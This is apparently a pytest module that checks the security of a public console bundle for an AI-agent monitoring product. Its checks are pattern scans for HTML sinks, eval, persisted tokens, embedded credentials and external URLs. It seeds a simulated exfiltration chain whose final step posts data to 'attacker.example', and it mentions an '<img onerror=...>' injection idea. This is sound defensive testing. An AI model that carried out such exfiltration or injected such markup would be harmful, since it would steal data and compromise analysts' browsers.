"""The console bundle is PUBLIC. These tests are what keeps that safe to say.

WHY A WHOLE MODULE FOR THREE STATIC FILES
-------------------------------------------
`/console`, `/console/app.js` and `/console/app.css` are served WITHOUT
authentication. That is deliberate for an SPA shell and it means anyone who can
reach the port can read every byte. The bundle's header comment makes four
claims about what it does not contain -- no credential, no internal hostname, no
tenant identifier, no internal-only comment -- and until this module those
claims were a human check that nothing re-ran.

The second reason is the one the whole product turns on. Every string this
console renders is attacker-influenced: an agent id, a tool name, a resource
path, a policy reason, a prompt fragment. A console that pasted any of it into
markup would be the single place the product's own premise was ignored, and it
would be the place an attacker with an agent id of `<img onerror=...>` reached a
security analyst's browser. `test_the_bundle_has_no_html_sink` is that check.
"""

from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

import pytest

CONSOLE = Path(__file__).resolve().parents[1] / "sentinel" / "interface" / "console"
ROOT = CONSOLE.parents[2]
TENANT = "console-live"
INGEST_KEY = "console-ingest-00000000000000000"
ADMIN_KEY = "console-admin-000000000000000000"


def _without_block_comments(source: str) -> str:
    """Strip `/* ... */` so these tests read CODE, not prose.

    The bundle's header comment says, in words, "no localStorage, no
    sessionStorage, no document.cookie" -- and a scan of the raw file therefore
    finds `localStorage` and fails on the sentence promising it is absent. The
    same trap catches `@import` in the stylesheet's header.

    Line comments are deliberately NOT stripped: `//` also appears inside string
    literals (the SVG namespace), and a regex that cannot tell them apart would
    silently delete real code and make every test below vacuous. Every comment
    in these files that matters is a block comment.
    """
    return re.sub(r"/\*.*?\*/", "", source, flags=re.S)


JS = _without_block_comments((CONSOLE / "app.js").read_text(encoding="utf-8"))
CSS = _without_block_comments((CONSOLE / "app.css").read_text(encoding="utf-8"))
HTML = (CONSOLE / "index.html").read_text(encoding="utf-8")

#: XML namespace identifiers. These are never fetched -- `createElementNS`
#: compares the string, the browser makes no request -- so exempting them is not
#: a hole in `test_every_fetch_target_is_a_relative_path`. Listed rather than
#: pattern-matched so adding a second one is a deliberate edit.
_NAMESPACE_URIS = frozenset({"http://www.w3.org/2000/svg"})


# ── the one that matters most ────────────────────────────────────────────────


@pytest.mark.parametrize(
    "sink",
    [
        ".innerHTML",
        ".outerHTML",
        "insertAdjacentHTML",
        "document.write",
        "createContextualFragment",
        "new Function",
    ],
)
def test_the_bundle_has_no_html_sink(sink: str):
    """Every rendered string is attacker-influenced. There is no safe one."""
    assert sink not in JS, (
        f"{sink} in the console bundle: agent-supplied text would reach an "
        "analyst's browser as markup"
    )


def test_the_graph_is_built_with_dom_calls_not_markup():
    """The SVG carries agent-supplied labels. Assembling it from a string is the
    same defect as innerHTML wearing a different name.
    """
    assert "createElementNS" in JS
    assert "<svg" not in JS, "SVG assembled from a markup string"
    assert "<rect" not in JS


def test_eval_and_timer_string_forms_are_absent():
    """`setTimeout("code")` is `eval` with a delay."""
    assert not re.search(r"\beval\s*\(", JS)
    assert not re.search(r"set(Timeout|Interval)\s*\(\s*['\"]", JS)


# ── the public-bundle claims ─────────────────────────────────────────────────


def test_nothing_persists_the_token():
    """The token exists only in the DOM node for the life of the tab. Persisting
    it would leave a credential on the analyst's disk that outlives the session
    and is readable by anything else running on the origin.
    """
    for store in ("localStorage", "sessionStorage", "document.cookie", "indexedDB"):
        assert store not in JS, f"{store} in a bundle that handles an API token"


def test_every_fetch_target_is_a_relative_path():
    """An absolute URL would disclose deployment topology from an
    unauthenticated file, and would be a place to point the analyst's
    credentialed fetch at somewhere else.
    """
    absolute = [
        url
        for url in re.findall(r"""["'](https?://[^"']+)["']""", JS)
        if url not in _NAMESPACE_URIS
    ]
    assert not absolute, f"absolute URLs in a public bundle: {absolute}"


def test_the_bundle_declares_the_routes_it_uses():
    """The header claims the API paths are the documented public interface. That
    claim is checkable only if the list is in one place, so ROUTES must actually
    cover the fetches -- an undeclared path would make the header stale without
    anything failing.
    """
    declared = re.search(r"var ROUTES = \[(.*?)\];", JS, re.S)
    assert declared, "ROUTES array missing; the header's claim is unverifiable"
    listed = set(re.findall(r'"(/[^"]+)"', declared.group(1)))

    used = set()
    for match in re.findall(r'(?:api|fetch)\(\s*"(/[^"]*)"', JS):
        used.add(match)
    # Paths built by concatenation appear as their literal prefix.
    for match in re.findall(r'"(/v1/[^"]*/)"\s*\+', JS):
        used.add(match)

    undeclared = {
        path
        for path in used
        if not any(path.startswith(known) or known.startswith(path) for known in listed)
    }
    assert not undeclared, f"fetched but not declared in ROUTES: {sorted(undeclared)}"


def test_no_credential_shaped_literal_is_embedded():
    """A default token or key in a file served without authentication is a
    disclosed one.
    """
    suspicious = re.findall(
        r"""["'](?:sk-|ghp_|AKIA|Bearer\s+\w|-----BEGIN)[^"']*["']""", JS
    )
    assert not suspicious, f"credential-shaped literals: {suspicious}"


def test_the_stylesheet_pulls_no_external_asset():
    """`default-src 'none'` would block it anyway; a self-contained sheet means
    the page looks the same in a deployment that tightened the policy further.
    """
    assert "@import" not in CSS
    assert not re.search(r"url\(\s*['\"]?https?://", CSS)


def test_the_html_loads_only_its_own_bundle():
    assert '<script src="/console/app.js">' in HTML
    assert 'href="/console/app.css"' in HTML
    external = re.findall(r'(?:src|href)="(https?://[^"]+)"', HTML)
    assert not external, f"external resources in the shell: {external}"


def test_there_are_no_inline_scripts_or_styles():
    """The CSP is `script-src 'self'` with no `unsafe-inline`. An inline handler
    would silently not run, which is worse than failing loudly.
    """
    assert not re.search(r"<script(?![^>]*\bsrc=)[^>]*>", HTML)
    assert not re.search(r"\son\w+\s*=", HTML), "inline event handler attribute"
    assert "<style" not in HTML
    assert not re.search(r'\sstyle\s*=\s*"', HTML)


# ── the shell and the code agree ─────────────────────────────────────────────


def test_every_nav_button_has_a_view_to_show():
    """A nav entry with no panel is a dead tab. A panel with no nav entry is
    unreachable UI -- the console equivalent of an unwired component.
    """
    tabs = set(re.findall(r'data-view="([a-z]+)"', HTML))
    views = set(re.findall(r'id="view-([a-z]+)"', HTML))
    assert tabs == views, f"nav/view mismatch: only in nav {tabs - views}, only as view {views - tabs}"


def test_every_view_has_a_loader():
    """A tab that loads nothing renders an empty panel that reads as 'no data'."""
    tabs = set(re.findall(r'data-view="([a-z]+)"', HTML))
    loaders = set(re.findall(r"^\s{4}(\w+): function \(\)", JS, re.M))
    missing = tabs - loaders
    assert not missing, f"views with no loader: {sorted(missing)}"


def test_every_element_the_code_reaches_for_exists_in_the_shell():
    """`el("agent-baseline")` returning null is a silent dead panel: no error,
    no content, and a reader concludes there is nothing to show.
    """
    wanted = set(re.findall(r'\bel\("([a-z-]+)"\)', JS))
    present = set(re.findall(r'id="([a-z-]+)"', HTML))
    missing = wanted - present
    assert not missing, f"referenced but absent from index.html: {sorted(missing)}"


# ── honesty surfaces ─────────────────────────────────────────────────────────


def test_a_refused_panel_says_so_rather_than_rendering_empty():
    """A 403 that renders an empty list reads as 'nothing to see', which is the
    opposite of what happened.
    """
    assert "not permitted for this role" in JS
    assert "could not load: " in JS


def test_the_console_states_its_own_limits_in_the_product():
    """A console showing six panels of green implies a completeness the
    deployment may not have. The limits belong where the analyst is, not only in
    a README they did not open.
    """
    for claim in (
        "performs no containment",
        "not an inline network interceptor",
        "established=false",
    ):
        assert claim in JS, f"missing limit statement: {claim!r}"


def test_a_broken_causal_chain_is_reported_in_words():
    """Several roots means steps arrived without the parent that explains them.
    Leaving a reader to notice the drawing has two trees is not reporting it.
    """
    assert "roots" in JS
    assert "causal chain is incomplete" in JS


def test_the_layout_survives_a_parent_cycle():
    """Caller-supplied parent links can form a cycle. That is malformed data,
    not a reason to hang the analyst's tab, so the walk is depth-guarded.
    """
    assert "guard > 64" in JS, "no recursion guard in the graph layout"


# ── the console must not manufacture its own failures ────────────────────────


def test_no_panel_fetches_a_route_that_requires_query_parameters_without_them():
    """Two defects, one shape, both found by opening the console rather than by
    this suite.

    `loadReach` fetched `/v1/inventory/reach` with no query string. That route
    REQUIRES `kind` and `pattern`, so every visit to the Agents view rendered
    "could not load: 422" -- a panel permanently reporting a failure that was
    the console's own doing, sitting beside panels that report real ones, with
    nothing to tell them apart. A console that cries wolf on every load teaches
    an operator to ignore the one time it is right.

    Checked against the routes' real signatures rather than against a list: a
    handler that gains a required parameter would otherwise break the console
    silently, which is exactly how this arose.
    """
    import inspect
    import re as _re

    from scripts.dev.route_inventory import collect

    # Bare GET paths the bundle fetches, with no query string attached.
    fetched = set(_re.findall(r'(?:api|panel\([^,]+,)\s*"(/v1/[^"?]*)"', JS))

    required: dict[str, list[str]] = {}
    for route in collect():
        if route["method"] != "GET":
            continue
        module = __import__(
            route["module"].replace("/", ".").removesuffix(".py"),
            fromlist=["*"],
        )
        source = inspect.getsource(module)
        # The handler's own signature, not the whole module.
        match = _re.search(
            rf"def {route['handler']}\((.*?)\):", source, _re.S
        )
        if not match:
            continue
        params = []
        for line in match.group(1).split(","):
            line = line.strip()
            if not line or "=" in line or line.startswith("*"):
                continue
            name, _, annotation = line.partition(":")
            name = name.strip()
            # FastAPI INJECTS these by type; they are not query parameters, and
            # counting them would report a route as needing arguments a caller
            # cannot supply. `/health/ready` takes `response: Response` and was
            # flagged until this filter existed.
            if annotation.strip() in {
                "Response", "Request", "BackgroundTasks", "WebSocket"
            }:
                continue
            # Path parameters are supplied by the URL, not the query string.
            if name and name not in route["path_parameters"]:
                params.append(name)
        if params:
            required[route["path"]] = params

    offenders = {
        path: required[path] for path in fetched if path in required
    }
    assert not offenders, (
        "the console fetches these routes with no query string, but they "
        f"require parameters: {offenders}. The panel will render a 4xx as "
        "'could not load', which is indistinguishable from a real outage."
    )


def test_the_reach_panel_explains_itself_before_anything_is_typed():
    """It deliberately does not fetch on view entry -- the route needs a
    pattern and there is no sensible default, because Sentinel cannot guess
    which resources matter to an estate.

    An empty box with no text reads as a panel that failed silently, so the
    prompt is initial markup rather than something a loader paints.
    """
    assert "enter a pattern to search the reach graph" in HTML


def test_a_404_on_the_organisation_is_shown_as_a_state_not_a_failure():
    """No organisation created for this tenant is an answer, not an outage.

    Rendering "could not load: 404" told an operator the console was broken
    when the truth was "there is nothing here yet". The distinction has to be
    explicit so a REAL failure still reads as one.
    """
    assert 'err.message === "404"' in JS
    assert "no organisation has been created for this tenant" in JS


def test_every_view_panel_carries_the_class_the_switcher_selects():
    """`showView` iterates `.view`, not `main`.

    A panel added without `class="view"` is not merely invisible. The switcher
    sets `hidden = node.id !== "view-" + name` across everything it FINDS, so
    selecting the classless view hides every real panel and unhides nothing --
    the whole console goes blank, on every tab, until reload.

    That is what happened when the Policy and Assess panels were added. It
    survived a check that read `innerText` from each panel and found content,
    because innerText still returns text from a hidden element. Only a
    screenshot showed it. So this asserts the STRUCTURE the switcher depends
    on, rather than sampling rendered text.
    """
    import re as _re

    panels = _re.findall(r'<main id="view-([\w-]+)"([^>]*)>', HTML)
    assert panels, "no view panels found; has the markup moved?"

    classless = [name for name, attrs in panels if 'class="view"' not in attrs]
    assert not classless, (
        f"these view panels lack class=\"view\": {classless}. `showView` "
        "selects `.view`, so choosing one of these hides every other panel and "
        "shows nothing at all."
    )


def test_every_nav_button_has_a_panel_and_a_loader():
    """A nav button with no panel selects nothing; a panel with no loader
    throws inside `showView` and leaves the console mid-switch.
    """
    import re as _re

    buttons = set(_re.findall(r'<button[^>]*data-view="([\w-]+)"', HTML))
    panels = set(_re.findall(r'<main id="view-([\w-]+)"', HTML))
    loaders_block = _re.search(r"var LOADERS = \{(.*?)\n  \};", JS, _re.S)
    assert loaders_block, "LOADERS object not found"
    loaders = set(_re.findall(r"^\s{4}(\w+): function", loaders_block.group(1), _re.M))

    assert buttons == panels, (
        f"nav buttons and panels disagree: buttons-only={sorted(buttons - panels)}, "
        f"panels-only={sorted(panels - buttons)}"
    )
    assert buttons <= loaders, (
        f"these views have no loader, so `showView` throws on them: "
        f"{sorted(buttons - loaders)}"
    )


# ── live route/action coverage ───────────────────────────────────────────────


def _free_port() -> int:
    for _ in range(50):
        with socket.socket() as probe:
            try:
                probe.bind(("127.0.0.1", 0))
            except PermissionError as exc:
                pytest.skip(f"localhost sockets are blocked in this sandbox: {exc}")
            port = int(probe.getsockname()[1])
        if port:
            return port
    raise AssertionError("could not allocate a localhost port")


def _wait_ready(base: str, process: subprocess.Popen[bytes]) -> None:
    deadline = time.monotonic() + 45
    last = "no response"
    while time.monotonic() < deadline:
        if process.poll() is not None:
            output = b""
            if process.stdout is not None:
                output = process.stdout.read() or b""
            raise AssertionError(
                "server exited before ready:\n"
                + output.decode("utf-8", "replace")[-2000:]
            )
        try:
            with urllib.request.urlopen(f"{base}/health/ready", timeout=2) as r:
                if r.status == 200:
                    return
                last = f"ready returned {r.status}"
        except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError) as exc:
            last = str(exc)
        time.sleep(0.25)
    raise AssertionError(f"server was not ready within 45s: {last}")


def _request(
    base: str,
    method: str,
    path: str,
    key: str | None = None,
    body: dict | None = None,
) -> tuple[int, dict | str, dict[str, str]]:
    headers = {"Accept": "application/json"}
    if key:
        headers["Authorization"] = f"Bearer {key}"
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(
        f"{base}{path}", data=data, headers=headers, method=method
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            raw = response.read()
            ctype = response.headers.get("content-type", "")
            parsed: dict | str
            parsed = (
                json.loads(raw or b"{}")
                if "json" in ctype
                else raw.decode("utf-8", "replace")
            )
            return response.status, parsed, dict(response.headers)
    except urllib.error.HTTPError as error:
        raw = error.read()
        try:
            parsed = json.loads(raw or b"{}")
        except json.JSONDecodeError:
            parsed = raw.decode("utf-8", "replace")
        return error.code, parsed, dict(error.headers)


def _json(base: str, method: str, path: str, key: str, body: dict | None = None) -> dict:
    status, payload, _headers = _request(base, method, path, key, body)
    assert status < 400, (method, path, status, payload)
    assert isinstance(payload, dict), (method, path, payload)
    return payload


def _migrate(db_path: Path, env: dict[str, str]) -> None:
    result = subprocess.run(
        [
            sys.executable,
            "-c",
            "from sentinel.composition.settings import Settings;"
            "from sentinel.infrastructure.sql.engine import build_engine;"
            "from sentinel.infrastructure.sql.migrate import migrate;"
            "pool = build_engine(Settings.from_environment().engine);"
            "migrate(pool); pool.close()",
        ],
        cwd=ROOT,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result.returncode == 0, result.stderr or result.stdout
    # The file check is a SQLite fact. On PostgreSQL the database lives on
    # the server the DSN names and there is no path to look for.
    if db_path is not None:
        assert db_path.exists()


def _seed_events(base: str) -> None:
    attack = (
        {
            "eventId": "console-1",
            "sessionId": "console-session",
            "agentId": "console-agent",
            "eventType": "tool_call",
            "action": "read_file",
            "resource": "customers",
            "timestamp": "2026-09-11T10:00:00Z",
        },
        {
            "eventId": "console-2",
            "parentEventId": "console-1",
            "sessionId": "console-session",
            "agentId": "console-agent",
            "eventType": "tool_call",
            "action": "zip",
            "timestamp": "2026-09-11T10:00:05Z",
        },
        {
            "eventId": "console-3",
            "parentEventId": "console-2",
            "sessionId": "console-session",
            "agentId": "console-agent",
            "eventType": "tool_call",
            "action": "http_post",
            "destination": "https://attacker.example",
            "timestamp": "2026-09-11T10:00:09Z",
        },
        {
            "eventId": "console-4",
            "sessionId": "console-benign",
            "agentId": "benign-agent",
            "eventType": "tool_call",
            "action": "read_file",
            "resource": "docs",
            "timestamp": "2026-09-11T10:01:00Z",
        },
    )
    outcomes = []
    for event in attack:
        body = _json(base, "POST", "/v1/events", INGEST_KEY, event)
        outcomes.append(str(body.get("outcome", "")))
    assert "incident_admitted" in outcomes


def test_operator_console_live_routes_and_actions(engine_config, tmp_path: Path):
    """The console against a REAL server, on both engines.

    `engine_config` (conftest) parametrises this over SQLite and PostgreSQL.
    The server is a separate process, so the engine is handed over through the
    same environment variables a deployment uses -- which is also the only
    way to exercise the settings parser for the PostgreSQL DSN in this test.
    """
    from sentinel.infrastructure.sql.engine import Dialect

    port = _free_port()
    base = f"http://127.0.0.1:{port}"
    env = dict(os.environ)
    env.pop("SENTINEL_DATABASE_URL", None)
    env.pop("SENTINEL_DB_PATH", None)
    if engine_config.dialect is Dialect.SQLITE:
        db_path: Path | None = Path(engine_config.dsn)
        engine_env = {"SENTINEL_DB_PATH": engine_config.dsn}
    else:
        db_path = None
        engine_env = {"SENTINEL_DATABASE_URL": engine_config.dsn}
    env.update(
        {
            "PYTHONPATH": str(ROOT),
            **engine_env,
            "SENTINEL_API_KEYS": (
                f"{TENANT}:{INGEST_KEY}:ingest,{TENANT}:{ADMIN_KEY}:admin"
            ),
            "SENTINEL_BOOTSTRAP_TENANT": TENANT,
        }
    )
    _migrate(db_path, env)
    process = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "uvicorn",
            "--factory",
            "sentinel.interface.asgi:create_application",
            "--host",
            "127.0.0.1",
            "--port",
            str(port),
            "--log-level",
            "warning",
        ],
        cwd=ROOT,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        _wait_ready(base, process)
        status, html, headers = _request(base, "GET", "/console")
        assert status == 200
        assert isinstance(html, str)
        assert "Sentinel Operator Console" in html
        csp = headers.get("content-security-policy", "")
        assert "script-src 'self'" in csp
        assert "trusted-types sentinel-console" in csp

        _seed_events(base)
        incidents = _json(base, "GET", "/v1/incidents", ADMIN_KEY)
        assert incidents["incidents"], incidents
        first_incident = incidents["incidents"][0]["incident_id"]

        for path in (
            "/v1/dashboard",
            f"/v1/incidents/{first_incident}",
            f"/v1/incidents/{first_incident}/history",
            f"/v1/incidents/{first_incident}/report",
            "/v1/graph/coverage",
            "/v1/graph/sessions/console-session",
            "/v1/inventory/agents",
            "/v1/inventory/agents/console-agent",
            "/v1/inventory/reach?kind=resource&pattern=customers",
            "/v1/analysis/mcp-estate",
            "/v1/estate/ai-bom",
            "/v1/estate/exposure",
            "/v1/estate/adoption",
            "/v1/transparency/root",
            "/v1/transparency/published",
            "/v1/protect/bypass-signals",
            "/v1/orgs/current/members",
            "/health/diagnostics",
            "/v1/executions/binding/coverage",
            "/v1/executions/binding/diff",
        ):
            status, payload, _headers = _request(base, "GET", path, ADMIN_KEY)
            assert status in {200, 404, 503}, (path, status, payload)
            assert status != 404 or path == "/v1/orgs/current"

        root_status, root_payload, _headers = _request(
            base, "GET", "/v1/transparency/root", ADMIN_KEY
        )
        if root_status == 200 and isinstance(root_payload, dict):
            tree_size = int(root_payload["tree_size"])
            if tree_size:
                _json(base, "GET", "/v1/transparency/inclusion/0", ADMIN_KEY)
                _json(
                    base,
                    "GET",
                    f"/v1/transparency/consistency?old_size={tree_size}",
                    ADMIN_KEY,
                )

        contain = _json(
            base,
            "POST",
            "/v1/containments",
            ADMIN_KEY,
            {"scope": "agent", "selector": "console-agent", "reason": "live console test containment",
             "expiresAt": (__import__("datetime").datetime.now(__import__("datetime").timezone.utc)
                           + __import__("datetime").timedelta(hours=1)).isoformat()},
        )
        assert contain["containment_id"]
        released = _json(
            base,
            "DELETE",
            f"/v1/containments/{contain['containment_id']}",
            ADMIN_KEY,
        )
        assert released["outcome"]

        doc1 = {
            "note": "live one",
            "rules": [{"name": "observe", "effect": "warn", "actions": ["read_file"]}],
        }
        doc2 = {
            "note": "live two",
            "rules": [
                {"name": "block-post", "effect": "block", "actions": ["http_post"]}
            ],
        }
        _json(base, "POST", "/v1/policy/validate", ADMIN_KEY, doc1)
        v1 = _json(base, "POST", "/v1/policy/versions", ADMIN_KEY, doc1)["version"]
        v2 = _json(base, "POST", "/v1/policy/versions", ADMIN_KEY, doc2)["version"]
        _json(base, "GET", f"/v1/policy/diff?base={v1}&target={v2}", ADMIN_KEY)
        _json(base, "POST", f"/v1/policy/versions/{v2}/simulate?days=7", ADMIN_KEY)
        active = _json(
            base, "POST", f"/v1/policy/versions/{v2}/activate", ADMIN_KEY
        )
        assert active["active_version"] == v2

        skill = _json(
            base,
            "POST",
            "/v1/skills/assess",
            ADMIN_KEY,
            {"name": "console-check", "permissions": ["read_filesystem"]},
        )
        assert "score" in skill

        refused, _payload, _headers = _request(
            base,
            "POST",
            "/v1/approvals/not-an-approval",
            ADMIN_KEY,
            {"decision": "reject", "reason": "live route-shape check"},
        )
        assert refused in {400, 409}
    finally:
        process.terminate()
        try:
            process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait(timeout=5)
